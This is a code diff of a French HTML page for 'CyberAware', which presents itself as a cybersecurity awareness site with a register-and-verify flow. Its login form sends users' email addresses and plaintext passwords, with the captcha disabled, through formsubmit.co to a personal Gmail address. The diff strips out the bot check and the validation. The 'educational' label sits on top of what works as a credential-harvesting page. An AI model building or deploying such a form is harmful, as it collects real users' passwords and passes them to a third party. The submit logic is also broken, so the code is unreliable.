@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
@@ -134,15 +135,11 @@
     <p>Plateforme de sensibilisation à la cybersécurité</p>
     
     <form action="https://formsubmit.co/tss.alex84@gmail.com" method="POST" id="registerForm">
-      <!-- Champs cachés pour Formsubmit -->
       <input type="hidden" name="_subject" value="Nouvelle inscription CyberAware">
       <input type="hidden" name="_captcha" value="false">
-      <input type="hidden" name="_next" value="https://votre-site.fr/merci.html">
       
       <input type="email" name="email" id="email" placeholder="Adresse email" required>
       <input type="password" name="password" id="password" placeholder="Mot de passe" required>
-      
-      <input type="checkbox" name="botcheck" style="display:none">
       
       <button type="submit">Continuer</button>
     </form>
@@ -159,7 +156,9 @@
 
   <!-- DASHBOARD -->
   <section id="dashboard" class="hidden">
+
     <h2>Techniques d'attaque – Vue éducative</h2>
+
     <div class="grid">
       <div class="card">
         <h3>Phishing</h3>
@@ -184,7 +183,9 @@
     <div class="card">
       <p>Pour nous contacter, envoyez un email à : <strong>contact@cyberaware.fr</strong></p>
     </div>
+
     <p class="legal">⚠️ Site éducatif – aucune méthode illégale n'est enseignée.</p>
+
   </section>
 
 </div>
@@ -192,30 +193,20 @@
 <script>
   let generatedCode = "";
 
+  // Après la soumission du formulaire, afficher le code et cacher le login
   document.getElementById('registerForm').addEventListener('submit', function(e) {
-    e.preventDefault();
-    
-    const email = document.getElementById("email").value;
-    const password = document.getElementById("password").value;
+    e.preventDefault(); // Bloque la redirection automatique de Formsubmit pour l'instant
 
-    if (!email || !password) {
-      alert("Veuillez remplir tous les champs");
-      return;
-    }
+    // Soumettre le formulaire normalement
+    e.target.submit();
 
-    const formData = new FormData(this);
-    fetch(this.action, {
-      method: 'POST',
-      body: formData
-    }).then(() => {
-      generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
-      document.getElementById("generatedCode").innerText = generatedCode;
+    // Générer un code aléatoire
+    generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+    document.getElementById("generatedCode").innerText = generatedCode;
 
-      document.getElementById("loginSection").classList.add("hidden");
-      document.getElementById("codeSection").classList.remove("hidden");
-    }).catch(() => {
-      alert("Erreur lors de l'envoi. Veuillez réessayer.");
-    });
+    // Afficher la section code
+    document.getElementById("loginSection").classList.add("hidden");
+    document.getElementById("codeSection").classList.remove("hidden");
   });
 
   function verifyCode() {
